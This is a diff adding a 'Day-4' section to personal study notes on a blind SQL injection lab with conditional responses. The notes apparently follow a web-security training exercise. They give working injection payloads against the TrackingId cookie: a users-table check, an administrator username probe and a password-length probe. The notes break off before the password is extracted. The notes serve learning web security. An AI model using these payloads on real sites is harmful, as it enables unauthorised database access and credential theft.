@@ -58,3 +58,23 @@ Day-3
     - form the above command we got the admin id and password.
 
 Day-4
+* Blind SQL injection with conditional responses
+   - in this, we will first check that if the website is vulnerable to blind sqli or not
+   - here, the parameter for the vulnerability is trackingId and cookie.
+   - so we will try to run the following sql query:
+      = select tracking-id from tracking-table where trackingId = 'xyz'
+         + now, if trackingId exist, then query returns some value and we get "welcome back" message.
+         + else, we don't get any message.
+   - now we have to make some changes in the query by adding some always TRUE condition, like 1=1 (which is always true)
+   - select tracking-id from tracking-table where trackingId = 'xyz' and 1=1
+   - and YES, we got the "Welcome Back" message.
+   - now our task is to check whether if have any user table or not. For that, we have to give the condition:
+      + select tracking-id from tracing-table where trackingId = 'xyz' and (select 'x' from users LIMIT 1) = 'x'--
+      + here we have used LIMIT 1 to just one entry from the table to not ruin the whole process even if have the right results.
+   - and yes, we got the right message.
+   - now we will get the username for the administrator 
+      + TrackingId=tNMbeLrLHnfKU2UB'+AND+(SELECT+'a'+FROM+users+where+username='administrator')='a
+   - now the next step is to get the password
+   - for that, we will modigy our query by checking the password length one by one until we get some error.
+   - +AND+(SELECT+'a'+FROM+users+WHERE+username%3d'administrator'+AND+LENGTH(password)>1)%3d'a
+   - 
